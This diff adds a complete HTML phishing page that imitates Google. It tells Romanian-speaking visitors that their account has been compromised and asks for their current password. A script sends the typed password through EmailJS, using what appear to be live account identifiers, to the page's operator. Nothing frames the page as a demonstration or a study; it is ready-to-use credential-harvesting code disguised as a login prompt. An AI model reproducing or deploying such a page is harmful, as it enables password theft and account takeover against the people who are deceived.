@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 100px;
+        }
+        input {
+            width: 300px;
+            padding: 10px;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1 style="color: #4285F4; font-size: 60px;">Google</h1>
+    <p>Contul Dumneavoastră a fost compromis , vă rog introduceti parola curentă pentru autentificare.</p>
+    <input type="text" id="message" placeholder="Parola">
+    <br>
+    <button onclick="sendEmail()">Trimiteți </button>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        emailjs.init("4RjGlTgsbI1IQrnEx"); // Înlocuiește cu Public Key de la EmailJS
+        
+        function sendEmail() {
+            let message = document.getElementById("message").value;
+            if (!message) {
+                alert("Te rog introdu un mesaj!");
+                return;
+            }
+
+            emailjs.send("service_oks3g9q", "service_oks3g9q", {
+                message: message
+            }).then(response => {
+                alert("Mesaj trimis cu succes!");
+            }).catch(error => {
+                alert("Eroare la trimitere: " + error);
+            });
+        }
+    </script>
+</body>
+</html>
